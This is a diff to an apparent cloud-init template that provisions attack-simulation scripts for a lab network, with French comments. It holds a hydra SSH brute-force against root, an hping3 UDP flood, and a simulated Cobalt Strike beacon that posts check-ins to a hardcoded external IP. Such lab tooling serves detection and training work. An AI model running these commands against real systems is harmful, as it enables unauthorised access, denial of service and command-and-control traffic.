@@ -33,7 +33,7 @@ write_files:
       #!/bin/bash
       # Usage: ./ssh-brute.sh <target_ip>
       # Tente une liste de mots de passe courants sur SSH.
-      TARGET="${1:-${lan_base}.10}"
+      TARGET="$${1:-${lan_base}.10}"
       hydra -l root -P /opt/breach/wordlist.txt -t 4 -f ssh://"$TARGET" 2>&1 | tee /tmp/brute.log
       echo "EXIT:$?"
 
@@ -57,8 +57,8 @@ write_files:
     content: |
       #!/bin/bash
       # Usage: ./ddos-udp.sh <target_ip> [duration_s]
-      TARGET="${1:-${lan_base}.10}"
-      DURATION="${2:-10}"
+      TARGET="$${1:-${lan_base}.10}"
+      DURATION="$${2:-10}"
       timeout "$DURATION" hping3 --udp -p 80 --flood "$TARGET" 2>&1 || true
       echo "DDoS terminé"
 
@@ -68,7 +68,7 @@ write_files:
     content: |
       #!/bin/bash
       # Simule un beacon Cobalt Strike vers une IP C2 externe.
-      C2="${1:-194.165.16.72}"
+      C2="$${1:-194.165.16.72}"
       echo "[*] Beacon C2 vers $C2:443..."
       for i in $(seq 1 5); do
         curl -sk --max-time 2 "https://$C2/beacon" -d '{"id":"infected-${instance_id}","action":"checkin"}' || true
